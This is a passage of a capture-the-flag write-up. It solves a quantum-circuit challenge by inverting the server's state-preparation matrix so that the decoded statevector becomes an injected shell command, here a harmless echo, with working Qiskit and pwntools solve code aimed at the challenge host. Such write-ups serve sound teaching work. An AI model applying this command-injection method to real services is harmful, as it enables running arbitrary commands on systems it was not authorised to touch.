Let's start by creating an empty circuit with 5 qubits, and just sending that over. We can use the [`.qasm()` function](https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.qasm.html#qiskit.circuit.QuantumCircuit.qasm) to generate the OpenQASM string representation of the circuit, then encode it to base64:
```python
from qiskit import QuantumCircuit

qc = QuantumCircuit(5) # just an empty circuit

circuit = qc.qasm()
norm = 419.1873089681986 # let's just use the server norm for now

from base64 import b64encode
circuit = b64encode(circuit.encode())

from pwn import remote
# nc schrodingers-cat.chal.uiuc.tf 1337
r = remote("schrodingers-cat.chal.uiuc.tf", 1337)
r.sendlineafter(b'Please type your OpenQASM circuit as a base64 encoded string: ', circuit)
r.sendlineafter(b'Please enter your normalization constant (precision matters!): ', str(norm).encode())

rest = r.recvall().decode()
print(rest)
```

Sending this just prints `Hello, world!` as expected, since our circuit currently does nothing at all. Now, let's try and add a single gate to our circuit. We can use the [`.x()` function](https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.x.html#qiskit.circuit.QuantumCircuit.x) to add an $X$ gate to our circuit, say on qubit 0:
```python
qc = QuantumCircuit(5)
qc.x(0)
```

Interestingly, this time there's an error about invalid ASCII characters from the transform function:
```text
     ┌──────────────┐┌───────────────────────┐
q_0: ┤0             ├┤0                      ├
     │              ││                       │
q_1: ┤1             ├┤1                      ├
     │              ││                       │
q_2: ┤2 circuit-298 ├┤2 echo 'Hello, world!' ├
     │              ││                       │
q_3: ┤3             ├┤3                      ├
     │              ││                       │
q_4: ┤4             ├┤4                      ├
     └──────────────┘└───────────────────────┘
Invalid ASCII characters.
```

Interesting... let's try a different gate. How about the [$H$ gate](https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.h.html#qiskit.circuit.QuantumCircuit.h) this time?
```python
qc = QuantumCircuit(5)
qc.h(0)
```
We get a different error:
```text
     ┌──────────────┐┌───────────────────────┐
q_0: ┤0             ├┤0                      ├
     │              ││                       │
q_1: ┤1             ├┤1                      ├
     │              ││                       │
q_2: ┤2 circuit-298 ├┤2 echo 'Hello, world!' ├
     │              ││                       │
q_3: ┤3             ├┤3                      ├
     │              ││                       │
q_4: ┤4             ├┤4                      ├
     └──────────────┘└───────────────────────┘
Your rehydrated statevector isn't very precise. Try adding at least 6 decimal places of precision, or contact the challenge author if you think this is a mistake.
[1, 141, -5, 152, -5, 50, -21, 122, 0, 153, 47, 110, -62, 107, -2, 159, 6, 147, -4, 51, 0, 45, 0, 45, 0, 45, 0, 45, 0, 45, 0, 45]
```

Okay, seems the circuit is very fragile, since even a single gate can cause a huge disruption. Let's try taking a deeper look at how the server actually works, and seeing if there's anything we can use to help us.

## The state of the vector
Let's try seeing what the value of the statevectors are. We can copy over the server code and use [`qiskit.qi.Statevector`](https://qiskit.org/documentation/apidoc/quantum_info.html#module-qiskit.quantum_info) to see the result of the circuit:
```python
# normalization, transform, and all imports copied over
import qiskit.quantum_info as qi
server_sv, server_n = normalization("echo 'Hello, world!'") 
print(server_sv, server_n)

qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))

qc_sv = qi.Statevector(qc)
print(qc_sv) # see how its normalized

norm = 419.1873089681986
msg = transform(qc_sv, norm) # convert back to ascii
print(msg)
```
We get the same statevector, obviously:
```text
[0.24094241 0.23617127 0.24809911 0.26479809 0.07633819 0.09303717
 0.17176093 0.24094241 0.25764139 0.25764139 0.26479809 0.10496501
 0.07633819 0.28388264 0.26479809 0.2719548  0.25764139 0.23855684
 0.07872376 0.09303717 0.07633819 0.07633819 0.07633819 0.07633819
 0.07633819 0.07633819 0.07633819 0.07633819 0.07633819 0.07633819
 0.07633819 0.07633819] 419.1873089681986 // server_sv, server_n

Statevector([0.24094241+0.j, 0.23617127+0.j, 0.24809911+0.j,
             0.26479809+0.j, 0.07633819+0.j, 0.09303717+0.j,
             0.17176093+0.j, 0.24094241+0.j, 0.25764139+0.j,
             0.25764139+0.j, 0.26479809+0.j, 0.10496501+0.j,
             0.07633819+0.j, 0.28388264+0.j, 0.26479809+0.j,
             0.2719548 +0.j, 0.25764139+0.j, 0.23855684+0.j,
             0.07872376+0.j, 0.09303717+0.j, 0.07633819+0.j,
             0.07633819+0.j, 0.07633819+0.j, 0.07633819+0.j,
             0.07633819+0.j, 0.07633819+0.j, 0.07633819+0.j,
             0.07633819+0.j, 0.07633819+0.j, 0.07633819+0.j,
             0.07633819+0.j, 0.07633819+0.j],
            dims=(2, 2, 2, 2, 2)) // qc_sv

echo 'Hello, world!' // msg
```

Just for fun, let's see what would happen if we repeated the same circuit:
```python
qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))
qc.append(StatePreparation(server_sv), range(5)) # twice
```
This actually also fails, and returns a completely messed up statevector:
```
Statevector([ 0.00310183+0.j, -0.0846333 +0.j, -0.07388225+0.j,
              0.01665548+0.j,  0.08883431+0.j, -0.00466635+0.j,
              0.06911396+0.j, -0.13734091+0.j,  0.00989164+0.j,
              0.08311832+0.j,  0.09896496+0.j, -0.01062691+0.j,
              0.04029352+0.j, -0.18419004+0.j, -0.0480201 +0.j,
              0.54101937+0.j,  0.01759582+0.j,  0.20532339+0.j,
             -0.04013826+0.j,  0.17487327+0.j,  0.04293363+0.j,
              0.01202631+0.j, -0.00127593+0.j,  0.18412711+0.j,
              0.00836774+0.j,  0.1099127 +0.j,  0.05956288+0.j,
              0.08344875+0.j, -0.04055421+0.j,  0.02260543+0.j,
             -0.01455059+0.j,  0.68737695+0.j],
            dims=(2, 2, 2, 2, 2)) // qc_sv

Your rehydrated statevector isn't very precise. Try adding at least 6 decimal places of precision, or contact the challenge author if you think this is a mistake.
[1, -35, -31, 7, 37, -2, 29, -58, 4, 35, 41, -4, 17, -77, -20, 227, 7, 86, -17, 73, 18, 5, -1, 77, 4, 46, 25, 35, -17, 9, -6, 288]
```

What about no circuit at all?
```python
qc = QuantumCircuit(5)
# qc.append(StatePreparation(server_sv), range(5))

qc_sv = qi.Statevector(qc)
print(qc_sv)

norm = 419.1873089681986
msg = transform(qc_sv, norm)
print(msg)
```
```text
Statevector([1.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j,
             0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j,
             0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j,
             0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j,
             0.+0.j, 0.+0.j, 0.+0.j, 0.+0.j],
            dims=(2, 2, 2, 2, 2))
```
We get a statevector of 1 followed by 31 zeroes. This might seem a bit confusing at first, since all the qubits should be in the 0 state, so how is there a 1 in the statevector?

Well, remember that the statevector doesn't actually record any value of the qubits, it just records the probabilities of the qubits being in some state. In this case, the 1 means theres a 100% chance all 5 qubits are measured to be 0, which makes sense.

But, while knowing the statevector is nice, this isn't getting us anywhere closer to the solution, so let's try something else.

## Mat:rice:s
So far we've been observing the qubits only through the statevector. But why is this? After all, the quantum circuit gates only act on individual qubits, so how can that transformation be represented in the statevector?

Well, obviously spoiled by the section title, but actually, *quantum logic gates are representable as [unitary matrices](https://en.wikipedia.org/wiki/Unitary_matrix)*. A gate that acts on $n$ qubits is represented by a $2^n$ by $2^n$ matrix. For example, here are some gates and their matrix representations ([taken from Wikipedia](https://en.wikipedia.org/wiki/Quantum_logic_gate)):

$$
X = \begin{bmatrix} 0 & 1 \\\\ 1 & 0 \end{bmatrix}
\qquad
$$

$$
H = \frac{1}{\sqrt{2}} \begin{bmatrix} 1 & 1 \\\\ 1 & -1 \end{bmatrix}
\qquad
$$

To apply a gate to a qubit, we simply multiply the gate matrix with the qubit's statevector. For example, if we have a qubit in the state $|0\rangle$, and we apply the $X$ gate to it, we get:

$$
X|0\rangle = \begin{bmatrix} 0 & 1 \\\\ 1 & 0 \end{bmatrix} \begin{bmatrix} 1 \\\\ 0 \end{bmatrix} = \begin{bmatrix} 0 \\\\ 1 \end{bmatrix} = |1\rangle
$$

Now, because these matrices are unitary, we can easily find their inverse, and create an inverse gate that does the exact opposite of the original gate. This is actually one of the key properties of quantum circuits, in that their are always reversible, as long as they do not collapse any qubits.

In addition, multiple gates together just combine into one larger matrix, as matrix multiplication is already a very well defined thing. This means we can take the server's given circuit, and find its matrix representation very easily using [`qiskit.quantum_info.Operator`](https://qiskit.org/documentation/stubs/qiskit.quantum_info.Operator.html):

```python
server_sv, server_n = normalization("echo 'Hello, world!'") 

qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))

mat = qi.Operator(qc)
print(mat)
```
```
Operator([[ 0.24094241+0.j, -0.23617127+0.j, -0.25913738+0.j, ...,
            0.08825212+0.j,  0.09683406+0.j, -0.09491655+0.j],
          [ 0.23617127+0.j,  0.24094241+0.j, -0.25400594+0.j, ...,
           -0.09003499+0.j,  0.09491655+0.j,  0.09683406+0.j],
          [ 0.24809911+0.j, -0.26479809+0.j,  0.23067918+0.j, ...,
            0.09894935+0.j, -0.08619984+0.j,  0.09200176+0.j],
          ...,
          [ 0.07633819+0.j,  0.07633819+0.j, -0.07633819+0.j, ...,
            0.27714851+0.j, -0.27714851+0.j, -0.27714851+0.j],
          [ 0.07633819+0.j, -0.07633819+0.j,  0.07633819+0.j, ...,
           -0.27714851+0.j,  0.27714851+0.j, -0.27714851+0.j],
          [ 0.07633819+0.j,  0.07633819+0.j,  0.07633819+0.j, ...,
            0.27714851+0.j,  0.27714851+0.j,  0.27714851+0.j]],
         input_dims=(2, 2, 2, 2, 2), output_dims=(2, 2, 2, 2, 2))
```

The whole thing is a 32 by 32 matrix. Now, we can do a lot of things with this matrix. For example, let's just confirm that it actually works as intended, by multiplying with the base statevector:
```python
server_sv, server_n = normalization("echo 'Hello, world!'") 
qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))

mat = qi.Operator(qc)
mat = np.array(mat.data)

base = np.array([1] + [0] * 31) # |00000>
```
To prove that this is the same, normalizing this result gives us back the `echo 'Hello, world!'` string!
```python
after = mat @ base
print(after)
print(transform(after, server_n))
```
```
[0.24094241+0.j 0.23617127+0.j 0.24809911+0.j 0.26479809+0.j
 0.07633819+0.j 0.09303717+0.j 0.17176093+0.j 0.24094241+0.j
 0.25764139+0.j 0.25764139+0.j 0.26479809+0.j 0.10496501+0.j
 0.07633819+0.j 0.28388264+0.j 0.26479809+0.j 0.2719548 +0.j
 0.25764139+0.j 0.23855684+0.j 0.07872376+0.j 0.09303717+0.j
 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j
 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j
 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j 0.07633819+0.j]
echo 'Hello, world!'
```

What about the other way around? We can easily invert the matrix, so let's make sure that works too:
```python
server_sv, server_n = normalization("echo 'Hello, world!'") 
qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))

mat = qi.Operator(qc)
mat = np.array(mat.data)

inv_mat = np.linalg.inv(mat)
base = inv_mat @ server_sv
print(base)
```
```
[ 1.00000000e+00+0.j -3.33066907e-16+0.j -1.80411242e-16+0.j
 -2.91433544e-16+0.j -2.77555756e-16+0.j  1.14491749e-16+0.j
 -1.77809156e-16+0.j -1.04083409e-16+0.j -1.33573708e-16+0.j
 -7.28583860e-17+0.j  1.38777878e-17+0.j  1.09287579e-16+0.j
  1.04083409e-16+0.j -1.77809156e-17+0.j -1.56125113e-17+0.j
  3.46944695e-17+0.j -2.15105711e-16+0.j  2.77555756e-17+0.j
 -6.24500451e-17+0.j -8.58688121e-17+0.j  1.38777878e-17+0.j
  3.64291930e-17+0.j  5.94142791e-17+0.j  3.12250226e-17+0.j
 -2.13370988e-16+0.j -1.04083409e-17+0.j -1.38777878e-17+0.j
 -1.01481323e-16+0.j -1.04083409e-17+0.j -5.89805982e-17+0.j
 -5.72458747e-17+0.j -4.51028104e-17+0.j]
```
Yep, it returns the base statevector we found earlier as well (the other numbers are small enough to be considered 0). 

Now, since we know the matrix represention of the circuit, we can find a target statevector we want the final result to be, multiply by the inverse matrix, and we'll get the statevector we want to end up after our own circuit! Mathematically, we have:

$$
\begin{align}
T &= \text{target statevector} \\\\
M &= \text{matrix representation of the circuit} \\\\
X &= \text{unknown original statevector} \\\\
\\newline
MX &= T \\\\
X &= M^{-1} T
\end{align}
$$

To create $T$, we can just use the server's `normalization` function and use the returned statevector. Then, to find $X$, we just do simple matrix multiplication. Let's try it out!

```python
server_sv, server_n = normalization("echo 'Hello, world!'") 
qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))
mat = qi.Operator(qc)
mat = np.array(mat.data)

wanted_sv, wanted_n = normalization("echo 'PWNED!'")
inv_mat = np.linalg.inv(mat)

X = inv_mat @ wanted_sv
print(X, np.linalg.norm(X))
```
```
[ 0.9076335 +0.j -0.04412251+0.j  0.01634292+0.j  0.03698722+0.j
 -0.06906886+0.j -0.04673537+0.j -0.01752824+0.j  0.01427621+0.j
 -0.20692711+0.j -0.01171279+0.j -0.02737254+0.j  0.05108334+0.j
 -0.10947422+0.j  0.00239175+0.j  0.01199106+0.j  0.02742216+0.j
 -0.06468989+0.j  0.02382291+0.j  0.07320342+0.j -0.0310617 +0.j
  0.15398962+0.j  0.02346015+0.j -0.02452697+0.j -0.0023462 +0.j
  0.26119513+0.j  0.00535547+0.j -0.02980742+0.j -0.01968094+0.j
 -0.00760883+0.j -0.00095966+0.j  0.0118614 +0.j -0.01672764+0.j]
1.0000000000000004 # norm is ~1
```

Since the norm of $X$ is 1, we know that it's a valid statevector. Then, we can use [`qiskit.circuit.library.StatePreparation`](https://qiskit.org/documentation/stubs/qiskit.circuit.library.StatePreparation.html), which is what the server uses to create it's `echo 'Hello, world!'` circuit, to create our own circuit that initializes the statevector $X$.

However, we also need to supply a normalization constant to the server. That's what the second output of `normalization` is for. When we create $T$, the second output of the function will later be used as our normalization constant to transform the statevector back to ASCII.

From here, we can simulate what the server does, append the `echo 'Hello, world!'` circuit, then run the entire circuit:
```python
server_sv, server_n = normalization("echo 'Hello, world!'") 
qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))
M = qi.Operator(qc)
M = np.array(M.data)

T, T_n = normalization("echo 'PWNED!'")
inv_mat = np.linalg.inv(M)
X = inv_mat @ T

qc = QuantumCircuit(5) # create a new circuit
qc.append(StatePreparation(X), range(5))
qc.append(StatePreparation(server_sv), range(5))

final_sv = qi.Statevector(qc)
print(transform(final_sv, T_n)) # use T_n, not server_n
```
And we've successfully injected our own command!
```
echo 'PWNED!'
```

## Too open for QASM
Let's add back our remote connection and try and run our exploit now:
```python
server_sv, server_n = normalization("echo 'Hello, world!'") 
qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))
M = qi.Operator(qc)
M = np.array(M.data)

T, T_n = normalization("echo 'PWNED!'")
inv_mat = np.linalg.inv(M)
X = inv_mat @ T

qc = QuantumCircuit(5)
qc.append(StatePreparation(X), range(5))

from base64 import b64encode
qc = b64encode(qc.qasm().encode())

from pwn import remote
# nc schrodingers-cat.chal.uiuc.tf 1337
r = remote("schrodingers-cat.chal.uiuc.tf", 1337)
r.sendlineafter(b'Please type your OpenQASM circuit as a base64 encoded string: ', qc)
print(r.recvline())
r.sendlineafter(b"Please enter your normalization constant (precision matters!): ", str(T_n).encode())
```
```
b'Error processing OpenQASM file! Try decomposing your circuit into basis gates using `transpile`.\n'
```
... what. Why doesn't this work? Well, it turns out that `StatePreparation` actually puts a ton of higher-level components into the quantum circuit, which QASM doesn't support. We can see this by printing out the QASM of the circuit:
```python
qc = QuantumCircuit(5)
qc.append(StatePreparation(X), range(5))
print(qc.qasm())
```
```text
OPENQASM 2.0;
include "qelib1.inc";
gate multiplex2_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_dg q0; }
gate multiplex3_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_dg q0,q1; }
gate multiplex1_reverse_reverse_reverse_dg q0 { rz(-5*pi/16) q0; }
gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_reverse_reverse_dg q0 { rz(pi/16) q0; }
gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex4_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_dg q0,q1,q2; }
gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { rz(pi/16) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { rz(pi/16) q0; }
gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
gate multiplex3_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex1_reverse_reverse_dg q0 { rz(3*pi/16) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { rz(3*pi/16) q0; }
gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_reverse_dg q0 { rz(-3*pi/16) q0; }
gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex4_reverse_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_reverse_reverse_dg q0,q1,q2; }
gate multiplex5_dg q0,q1,q2,q3,q4 { multiplex4_reverse_dg q0,q1,q2,q3; cx q4,q0; multiplex4_dg q0,q1,q2,q3; }
gate multiplex1_reverse_reverse_dg q0 { ry(0.2641656955605965) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(-0.24620498195865706) q0; }
gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.13304641215336743) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(-0.01903161831016388) q0; }
gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
gate multiplex3_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.12663407193268572) q0; }
gate multiplex1_reverse_reverse_reverse_reverse_reverse_dg q0 { ry(-0.09527394434543975) q0; }
gate multiplex2_reverse_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.05433464108732317) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.1060830543044343) q0; }
gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
gate multiplex3_reverse_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_reverse_reverse_dg q0,q1; }
gate multiplex4_reverse_reverse_dg q0,q1,q2,q3 { multiplex3_reverse_reverse_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_reverse_reverse_dg q0,q1,q2; }
gate multiplex1_reverse_reverse_dg q0 { ry(-0.06462168712231717) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.29540766001335417) q0; }
gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.18770789826999093) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.11911287309309918) q0; }
gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
gate multiplex3_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex1_reverse_reverse_dg q0 { ry(-0.01098245402315881) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(-0.09274358322577816) q0; }
gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_reverse_reverse_dg q0 { ry(-0.592259604583806) q0; }
gate multiplex1_reverse_dg q0 { ry(0.9352205187953326) q0; }
gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex4_reverse_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_reverse_reverse_dg q0,q1,q2; }
gate multiplex5_reverse_dg q0,q1,q2,q3,q4 { multiplex4_reverse_dg q0,q1,q2,q3; cx q4,q0; multiplex4_reverse_reverse_dg q0,q1,q2,q3; }
gate multiplex1_dg q0 { rz(-pi/16) q0; }
gate multiplex2_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_dg q0; }
gate multiplex1_reverse_reverse_dg q0 { rz(-5*pi/16) q0; }
gate multiplex1_reverse_dg q0 { rz(pi/16) q0; }
gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex3_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_dg q0,q1; }
gate multiplex1_reverse_reverse_reverse_dg q0 { rz(5*pi/16) q0; }
gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_reverse_reverse_dg q0 { rz(-pi/16) q0; }
gate multiplex1_reverse_dg q0 { rz(-7*pi/16) q0; }
gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex4_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_dg q0,q1,q2; }
gate multiplex1_reverse_reverse_dg q0 { ry(-0.3783961689717087) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.04073757609819237) q0; }
gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.5007054391135967) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.02626448423846639) q0; }
gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
gate multiplex3_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex1_reverse_reverse_dg q0 { ry(-0.14140732001433892) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.38765650017793357) q0; }
gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_reverse_reverse_dg q0 { ry(-0.14793357589641526) q0; }
gate multiplex1_reverse_dg q0 { ry(0.80272426096507) q0; }
gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex4_reverse_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_reverse_reverse_dg q0,q1,q2; }
gate multiplex1_reverse_dg q0 { rz(3*pi/16) q0; }
gate multiplex2_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_dg q0; }
gate multiplex1_reverse_reverse_dg q0 { rz(5*pi/16) q0; }
gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex3_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_dg q0,q1; }
gate multiplex1_reverse_reverse_dg q0 { ry(-0.24253725285517136) q0; }
gate multiplex1_reverse_reverse_reverse_dg q0 { ry(-0.6450812692512188) q0; }
gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_reverse_reverse_dg q0 { ry(0.25440434302082787) q0; }
gate multiplex1_reverse_dg q0 { ry(0.8226285605461638) q0; }
gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
gate multiplex1_reverse_dg q0 { rz(-pi/16) q0; }
gate multiplex2_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_dg q0; }
gate multiplex1_reverse_reverse_dg q0 { ry(-0.688784396189229) q0; }
gate multiplex1_reverse_dg q0 { ry(1.2092925685570255) q0; }
gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
gate multiplex1_dg q0 { rz(pi/16) q0; }
gate multiplex1_reverse_dg q0 { ry(0.6630894419589923) q0; }
gate disentangler_dg q0,q1,q2,q3,q4 { multiplex1_reverse_dg q4; multiplex1_dg q4; multiplex2_reverse_dg q3,q4; multiplex2_dg q3,q4; multiplex3_reverse_dg q2,q3,q4; multiplex3_dg q2,q3,q4; multiplex4_reverse_dg q1,q2,q3,q4; multiplex4_dg q1,q2,q3,q4; multiplex5_reverse_dg q0,q1,q2,q3,q4; multiplex5_dg q0,q1,q2,q3,q4; }
gate state_preparation(param0,param1,param2,param3,param4,param5,param6,param7,param8,param9,param10,param11,param12,param13,param14,param15,param16,param17,param18,param19,param20,param21,param22,param23,param24,param25,param26,param27,param28,param29,param30,param31) q0,q1,q2,q3,q4 { disentangler_dg q0,q1,q2,q3,q4; }
qreg q[5];
state_preparation(0.9076335045793169,-0.044122507924259646,0.01634292182813989,0.036987216556996244,-0.06906886425742421,-0.04673536929108797,-0.017528244610158387,0.014276207361454615,-0.2069271092485318,-0.011712786897487532,-0.02737253540530897,0.05108333711049387,-0.10947421547863946,0.0023917498632471737,0.01199106440311292,0.027422162932615034,-0.06468989291435842,0.023822905422690187,0.07320341986891087,-0.03106169917306942,0.15398961505027625,0.023460152088682004,-0.02452697057328079,-0.00234619511834995,0.26119513377737485,0.005355465113197955,-0.029807415041486443,-0.019680937823715723,-0.007608828289073272,-0.0009596579516268702,0.011861404188523104,-0.016727636286929682) q[0],q[1],q[2],q[3],q[4];
```
Thankfully, fixing this isn't too hard, but I did get stuck here for a while. It turns out the fix is to transpile the circuit to only a specific set of gates before calling `qasm()`, like so:
```python
qc = QuantumCircuit(5)
qc.append(StatePreparation(X), range(5))

qc_transpiled = transpile(qc, basis_gates=['u1', 'u2', 'u3', 'cx'])
print(qc_transpiled.qasm())
```

Putting this back into our solve script, we can see that we're actually able to execute commands on the server:
```python
import numpy as np
from qiskit import QuantumCircuit, transpile
import qiskit.quantum_info as qi
from qiskit.circuit.library import StatePreparation
from server import normalization, transform

server_sv, server_n = normalization("echo 'Hello, world!'") 
qc = QuantumCircuit(5)
qc.append(StatePreparation(server_sv), range(5))
M = qi.Operator(qc)
M = np.array(M.data)

T, T_n = normalization("echo 'PWNED!'")
inv_mat = np.linalg.inv(M)
X = inv_mat @ T

qc = QuantumCircuit(5)
qc.append(StatePreparation(X), range(5))

qc_transpiled = transpile(qc, basis_gates=['u1', 'u2', 'u3', 'cx'])

from base64 import b64encode
qasm_str = b64encode(qc_transpiled.qasm().encode())

from pwn import remote
# nc schrodingers-cat.chal.uiuc.tf 1337
r = remote("schrodingers-cat.chal.uiuc.tf", 1337)
